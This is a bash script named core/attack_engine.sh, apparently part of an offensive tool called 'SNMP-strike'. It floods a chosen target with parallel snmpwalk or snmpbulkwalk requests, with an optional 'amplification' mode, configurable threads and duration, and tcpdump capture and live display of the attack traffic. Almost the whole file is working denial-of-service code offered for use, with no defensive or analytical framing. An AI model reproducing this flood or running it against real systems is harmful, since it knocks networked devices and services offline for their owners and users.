#!/bin/bash

# core/attack_engine.sh

# Authors: ransc0rp1on & 6umi1029

# Check if running on Arch Linux
if [ -f "/etc/arch-release" ]; then
    IS_ARCH=true
else
    IS_ARCH=false
fi

source ../lib/terminal.sh
source ../lib/network.sh

# Global variables
ATTACK_PID=""
TCPDUMP_PID=""
TERMINAL_PID=""
ATTACK_RUNNING=false

# Function to launch SNMP flood attack
launch_snmp_flood() {
    local target=$1
    local community=$2
    local threads=$3
    local version=$4
    local duration=$5
    local amplification=$6
    local interface=$7
    
    draw_header "SNMP DoS ATTACK"
    info_msg "Target: $target | Community: $community"
    info_msg "Threads: $threads | Duration: $duration seconds"
    info_msg "SNMP Version: $version | Amplification: $amplification"
    info_msg "Interface: $interface"
    
    # Start traffic capture
    local capture_file="../outputs/capture_$(date +%s).pcap"
    mkdir -p ../outputs
    start_traffic_capture "$interface" "$capture_file"
    
    # Start terminal with real-time traffic visualization
    start_traffic_visualization "$interface" "$target"
    
    # Calculate end time
    local end_time=$((SECONDS + duration))
    
    # Start attack
    ATTACK_RUNNING=true
    (
        while [ $SECONDS -lt $end_time ] && [ "$ATTACK_RUNNING" = true ]; do
            for ((i=0; i<threads; i++)); do
                if [ "$amplification" = "true" ]; then
                    # Use a high amplification OID
                    snmpbulkwalk -v "$version" -c "$community" -Cn0 -Cr100 "$target" .1.3.6 >/dev/null 2>&1 &
                else
                    snmpwalk -v "$version" -c "$community" "$target" .1.3.6.1.2.1.1 >/dev/null 2>&1 &
                fi
            done
            sleep 0.1
            # Clean up background processes to prevent zombie accumulation
            wait
        done
    ) >/dev/null 2>&1 &
    
    ATTACK_PID=$!
    info_msg "Attack started with PID $ATTACK_PID"
    
    # Monitor attack
    monitor_attack "$duration" "$threads" "$target" "$capture_file"
}

# Function to start traffic capture
start_traffic_capture() {
    local interface=$1
    local output_file=$2
    
    # Check if interface exists
    if ! ip link show "$interface" &>/dev/null; then
        error_msg "Interface $interface not found!"
        return 1
    fi
    
    # Start tcpdump in background
    sudo tcpdump -i "$interface" -w "$output_file" "udp port 161" >/dev/null 2>&1 &
    TCPDUMP_PID=$!
    info_msg "Traffic capture started (PID: $TCPDUMP_PID)"
    info_msg "Capturing to: $output_file"
}

# Function to start traffic visualization in a new terminal
start_traffic_visualization() {
    local interface=$1
    local target=$2
    
    # Check if interface exists
    if ! ip link show "$interface" &>/dev/null; then
        error_msg "Interface $interface not found!"
        return 1
    fi
    
    # Check if we're in a graphical environment
    if [ -z "$DISPLAY" ]; then
        warning_msg "No graphical environment detected. Showing traffic in current terminal."
        (
            echo -e "\n${CYAN}Starting real-time traffic visualization...${NC}"
            echo -e "${YELLOW}Press Ctrl+C to stop visualization${NC}\n"
            sudo tcpdump -i "$interface" -n "udp port 161 and host $target" 2>/dev/null | \
            while read line; do
                echo -e "${YELLOW}[PACKET]${NC} $(date +'%H:%M:%S') $line"
            done
        ) &
        TERMINAL_PID=$!
        info_msg "Traffic visualization started in current terminal (PID: $TERMINAL_PID)"
        return 0
    fi
    
    # Debug: Check which terminal emulators are available
    echo -e "${CYAN}Checking for terminal emulators...${NC}"
    local terminals=("xterm" "gnome-terminal" "konsole" "terminator" "xfce4-terminal" "lxterminal" "alacritty")
    local found_terminal=""
    
    for term in "${terminals[@]}"; do
        if command -v "$term" &> /dev/null; then
            echo -e "  Found: ${GREEN}$term${NC}"
            found_terminal="$term"
            break
        else
            echo -e "  Not found: ${RED}$term${NC}"
        fi
    done
    
    if [ -z "$found_terminal" ]; then
        warning_msg "No terminal emulator found. Showing traffic in current terminal."
        (
            echo -e "\n${CYAN}Starting real-time traffic visualization...${NC}"
            echo -e "${YELLOW}Press Ctrl+C to stop visualization${NC}\n"
            sudo tcpdump -i "$interface" -n "udp port 161 and host $target" 2>/dev/null | \
            while read line; do
                echo -e "${YELLOW}[PACKET]${NC} $(date +'%H:%M:%S') $line"
            done
        ) &
        TERMINAL_PID=$!
        info_msg "Traffic visualization started in current terminal (PID: $TERMINAL_PID)"
        return 0
    fi
    
    # Start terminal with traffic visualization based on the found terminal
    case "$found_terminal" in
        "xterm")
            xterm -title "SNMP-strike Traffic Visualization" -e bash -c "echo 'Starting traffic visualization for $target...'; sudo tcpdump -i $interface -n \"udp port 161 and host $target\"" &
            ;;
        "gnome-terminal")
            gnome-terminal --title="SNMP-strike Traffic Visualization" -- bash -c "echo 'Starting traffic visualization for $target...'; sudo tcpdump -i $interface -n \"udp port 161 and host $target\"" &
            ;;
        "konsole")
            konsole --title "SNMP-strike Traffic Visualization" -e bash -c "echo 'Starting traffic visualization for $target...'; sudo tcpdump -i $interface -n \"udp port 161 and host $target\"" &
            ;;
        "terminator")
            terminator --title="SNMP-strike Traffic Visualization" -e "bash -c \"echo 'Starting traffic visualization for $target...'; sudo tcpdump -i $interface -n \\\"udp port 161 and host $target\\\"\"" &
            ;;
        "xfce4-terminal")
            xfce4-terminal --title="SNMP-strike Traffic Visualization" -e "bash -c \"echo 'Starting traffic visualization for $target...'; sudo tcpdump -i $interface -n \\\"udp port 161 and host $target\\\"\"" &
            ;;
        "lxterminal")
            lxterminal --title="SNMP-strike Traffic Visualization" -e "bash -c \"echo 'Starting traffic visualization for $target...'; sudo tcpdump -i $interface -n \\\"udp port 161 and host $target\\\"\"" &
            ;;
        "alacritty")
            alacritty --title "SNMP-strike Traffic Visualization" -e bash -c "echo 'Starting traffic visualization for $target...'; sudo tcpdump -i $interface -n \"udp port 161 and host $target\"" &
            ;;
    esac
    
    TERMINAL_PID=$!
    info_msg "Traffic visualization started in $found_terminal (PID: $TERMINAL_PID)"
}

# Function to stop attack
stop_attack() {
    if [ "$ATTACK_RUNNING" = false ]; then
        warning_msg "No attack running"
        return
    fi
    
    if [ -n "$ATTACK_PID" ]; then
        # Kill all snmp processes
        pkill -f "snmpwalk\|snmpbulkwalk" 2>/dev/null
        kill -9 "$ATTACK_PID" 2>/dev/null
        wait "$ATTACK_PID" 2>/dev/null
        ATTACK_PID=""
        ATTACK_RUNNING=false
        success_msg "Attack stopped"
    fi
    
    if [ -n "$TCPDUMP_PID" ]; then
        kill -2 "$TCPDUMP_PID" 2>/dev/null
        wait "$TCPDUMP_PID" 2>/dev/null
        TCPDUMP_PID=""
        success_msg "Traffic capture stopped"
    fi
    
    if [ -n "$TERMINAL_PID" ]; then
        kill -9 "$TERMINAL_PID" 2>/dev/null
        wait "$TERMINAL_PID" 2>/dev/null
        TERMINAL_PID=""
        success_msg "Traffic visualization stopped"
    fi
    
    # Kill any remaining tcpdump processes
    pkill -f "tcpdump -i.*udp port 161" 2>/dev/null
}

# Function to monitor attack progress
monitor_attack() {
    local duration=$1
    local threads=$2
    local target=$3
    local capture_file=$4
    local start_time=$SECONDS
    local progress=0
    
    while [ $progress -lt 100 ] && [ "$ATTACK_RUNNING" = true ]; do
        elapsed=$((SECONDS - start_time))
        progress=$((elapsed * 100 / duration))
        
        if [ $progress -gt 100 ]; then
            progress=100
        fi
        
        # Display progress
        clear
        draw_header "ATTACK IN PROGRESS"
        echo -e "  Target: ${CYAN}$target${NC}"
        echo -e "  Duration: ${YELLOW}$elapsed/$duration seconds${NC}"
        echo -e "  Estimated Packets Sent: ${GREEN}$((threads * elapsed * 10))${NC}"
        echo -e "  Capture File: ${BLUE}$capture_file${NC}"
        echo -e "  Traffic Terminal PID: ${MAGENTA}$TERMINAL_PID${NC}"
        echo
        
        # Draw progress bar
        draw_bar_chart $progress 100 "Progress"
        
        # Show recent packets from capture file
        if [ -f "$capture_file" ] && [ $elapsed -gt 3 ]; then
            echo -e "\n${CYAN}Recent packets captured:${NC}"
            tcpdump -r "$capture_file" -n -c 5 "udp port 161" 2>/dev/null | \
            while read line; do
                echo -e "  ${YELLOW}$line${NC}"
            done
        fi
        
        sleep 1
    done
    
    # Clean up after completion
    if [ "$ATTACK_RUNNING" = true ]; then
        stop_attack
        success_msg "Attack completed successfully!"
        
        # Show capture file summary
        if [ -f "$capture_file" ]; then
            echo -e "\n${CYAN}Capture file summary:${NC}"
            tcpdump -r "$capture_file" -n "udp port 161" 2>/dev/null | wc -l | \
            xargs echo -e "  Total packets captured: ${GREEN}"
        fi
    fi
}

# Function to run DoS attack
run_dos_attack() {
    local target=$1
    local community=$2
    
    # Default parameters
    local threads=50
    local version="2c"
    local duration=60
    local amplification="false"
    local interface=$(get_default_interface)
    
    # User input
    echo -n "Number of threads [default: 50]: "
    read -r custom_threads
    [ -n "$custom_threads" ] && threads="$custom_threads"
    
    echo -n "SNMP version (1|2c) [default: 2c]: "
    read -r custom_version
    [ -n "$custom_version" ] && version="$custom_version"
    
    echo -n "Duration (seconds) [default: 60]: "
    read -r custom_duration
    [ -n "$custom_duration" ] && duration="$custom_duration"
    
    echo -n "Enable amplification? (y/n) [default: n]: "
    read -r amp_choice
    if [ "$amp_choice" = "y" ] || [ "$amp_choice" = "Y" ]; then
        amplification="true"
    fi
    
    echo -n "Network interface [default: $interface]: "
    read -r custom_interface
    [ -n "$custom_interface" ] && interface="$custom_interface"
    
    # Confirm action
    if ! confirm_action "Launch DoS attack against $target?"; then
        info_msg "Attack canceled"
        return
    fi
    
    # Check for required tools
    if ! command -v snmpwalk &> /dev/null; then
        if [ "$IS_ARCH" = true ]; then
            error_msg "snmpwalk not found. Install with: sudo pacman -S net-snmp"
        else
            error_msg "snmpwalk not found. Install with: sudo apt install snmp"
        fi
        return 1
    fi
    
    if ! command -v tcpdump &> /dev/null; then
        if [ "$IS_ARCH" = true ]; then
            error_msg "tcpdump not found. Install with: sudo pacman -S tcpdump"
        else
            error_msg "tcpdump not found. Install with: sudo apt install tcpdump"
        fi
        return 1
    fi
    
    # Launch attack
    launch_snmp_flood "$target" "$community" "$threads" "$version" "$duration" "$amplification" "$interface"
}

# Set trap to clean up on exit
trap stop_attack EXIT INT TERM  